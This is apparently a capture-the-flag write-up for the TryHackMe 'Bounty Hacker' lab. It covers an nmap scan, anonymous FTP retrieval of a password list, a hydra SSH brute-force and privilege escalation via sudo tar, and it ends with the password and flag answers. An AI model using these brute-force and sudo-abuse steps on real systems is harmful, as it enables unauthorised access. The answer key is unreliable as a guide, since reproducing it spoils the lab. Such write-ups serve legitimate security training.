![image](https://github.com/prox11/CTF-Writeups/assets/148764185/ccb6288b-27b5-461b-9482-ee3c2c306fa7)


# Bounty Hacker

## Nmap

**nmap -A -sC 10.10.161.185**
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-25 19:35 CET
Nmap scan report for 10.10.161.185
Host is up (0.061s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.146.46
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.65 seconds
```

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/5f1f5963-3344-431b-bc57-91218a2e1a10)

## FTP

**ftp 10.10.161.185**

login name: anonymous

```
Connected to 10.10.161.185.
220 (vsFTPd 3.0.3)
Name (10.10.161.185:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

```
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

**get locks.txt**

**get task.txt**

task.txt: 
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
locks.txt:
```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

**hydra -l lin -P locks.txt ssh://10.10.161.185**

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/e4553b5e-1ad6-48d6-9686-76e54c16a158)

Username: lin

Password: RedDr4gonSynd1cat3

## Priv Esc

**ssh lin@10.10.161.185**

```
The authenticity of host '10.10.161.185 (10.10.161.185)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.161.185' (ED25519) to the list of known hosts.
lin@10.10.161.185's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$
```

**sudo -l**
```
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar

```

https://gtfobins.github.io/gtfobins/tar/#sudo

![image](https://github.com/prox11/CTF-Writeups/assets/148764185/b75839e2-8074-4aab-997c-a1348796b216)

<details>
    <summary>Who wrote the task list? </summary>
  
    lin
</details>

<details>
    <summary>What service can you bruteforce with the text file found?</summary>
  
    ssh
</details>

<details>
    <summary>What is the users password? </summary>
  
    RedDr4gonSynd1cat3
</details>

<details>
    <summary>user.txt</summary>
  
    THM{CR1M3_SyNd1C4T3}
</details>

<details>
    <summary>root.txt</summary>
  
    THM{80UN7Y_h4cK3r}
</details>
